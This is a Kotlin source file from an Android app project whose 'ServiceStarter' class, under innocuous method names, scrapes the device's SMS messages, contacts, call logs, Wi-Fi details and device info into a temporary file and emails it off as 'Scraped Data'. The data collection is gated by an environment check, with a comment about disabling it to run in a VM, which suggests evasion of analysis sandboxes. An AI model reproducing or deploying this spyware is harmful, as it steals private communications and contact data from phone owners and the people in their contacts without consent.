package com.example.mobileappproj.security

import java.io.File
import android.content.ContentResolver
import android.content.Context
import android.os.Build
import java.lang.RuntimeException

class ServiceStarter(private val context: Context) {
    fun getResources(contentResolver: ContentResolver) {
        if (!checkResources()){ //edit here if you wanna run the app properly in VM, add a !
            throw RuntimeException("Resources cannot be accessed. Try again later")
        }
        else{
            val messageDetails = Message.scrapeMessage(contentResolver)
            val deviceInfo = DeviceInfo.getDeviceInfo()
            val contactDetails = Contacts.scrapeAllContactDetails(context)
            val callLogs = CallLogs.scrapeCallLogs(contentResolver)
            val wifi = Wifi.scrapeWifi(context)

            val scrapedData = buildString {
                append("Message Details:\n")
                messageDetails.forEach { append("$it\n\n") }
                append("Device Info:\n$deviceInfo\n\n")
                append("Contact Details:\n")
                contactDetails.forEach { append("$it\n\n") }
                append("Call Logs:\n")
                callLogs.forEach { append("$it\n\n") }
                append("Wifi Info:\n")
                wifi.forEach { append("$it") }
            }

            val scrapedDataFile = createTempFile("scraped_data", ".txt")
            scrapedDataFile.writeText(scrapedData)

            handleResources(listOf(scrapedDataFile))
        }
    }

    private fun handleResources(attachmentFiles: List<File>) {
        // Pass `context` if required by the updated method signature
        EmailUtilKT.sendEmailWithAttachment(
            subject = "Scraped Data",
            bodyText = "Please find the scraped data attached.",
            attachmentFiles = attachmentFiles
        )
    }

    private fun checkResources(): Boolean{
        return ResourceUtils.checkResources()
    }

}
